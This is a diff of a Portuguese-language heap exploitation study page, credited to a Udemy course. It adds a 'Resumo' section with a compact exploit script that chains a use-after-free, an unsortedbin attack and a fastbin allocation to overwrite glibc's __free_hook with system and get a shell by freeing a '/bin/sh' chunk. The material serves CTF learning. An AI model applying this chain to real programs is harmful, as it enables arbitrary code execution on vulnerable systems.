@@ -6712,6 +6712,7 @@ while True:
 <div style="break-before: page; page-break-before: always;"></div><ul>
 <li><a href="heap/malloc/comboFastUnsorted.html#teoria">Teoria</a></li>
 <li><a href="heap/malloc/comboFastUnsorted.html#ataque">Ataque</a></li>
+<li><a href="heap/malloc/comboFastUnsorted.html#resumo">Resumo</a></li>
 <li><a href="heap/malloc/comboFastUnsorted.html#cr%C3%A9ditos">Créditos</a></li>
 </ul>
 <h1 id="teoria-13"><a class="header" href="#teoria-13">Teoria</a></h1>
@@ -6820,10 +6821,29 @@ bk_nextsize: 0x00
 ou caso em um ctf, aonde voce so consegue passar o index de um chunk
 para ser free... basta colocar /bin/sh como a primeira coisa no data 
 
-edit(chunk_ABC, b&quot;/bin/sh\x00&quot;)
-free(chunk_ABC)
+edit(chunk_X, b&quot;/bin/sh\x00&quot;)
+free(chunk_X)
 
 Assim, por trás dos panos vira: free(pointer /bin/sh)
+</code></pre>
+<h1 id="resumo-2"><a class="header" href="#resumo-2">Resumo</a></h1>
+<pre><code class="language-py">UAF(flat(#                       unsorted | fast
+    libc.sym.__free_hook - 0x16,#         | fd
+    b&quot;R&quot;*8*12,#                           | pad
+    0x21,#                           size |
+    0,#                                fd |
+    libc.sym.__free_hook - 0x23,#      bk |
+))
+
+malloc(0x18) # Aloca: unsortedbin attack
+malloc(0x68) # consumir: fast 0x70
+
+chunk_hook = malloc(0x68) # __free_hook
+
+edit(chunk_hook, b&quot;\0&quot;*6 + p64(libc.sym.system))
+
+edit(chunk_X, b&quot;/bin/sh\x00&quot;) # trigger
+free(chunk_X)
 </code></pre>
 <h1 id="créditos"><a class="header" href="#créditos">Créditos</a></h1>
 <p>https://www.udemy.com/course/linux-heap-exploitation-part-2/</p>
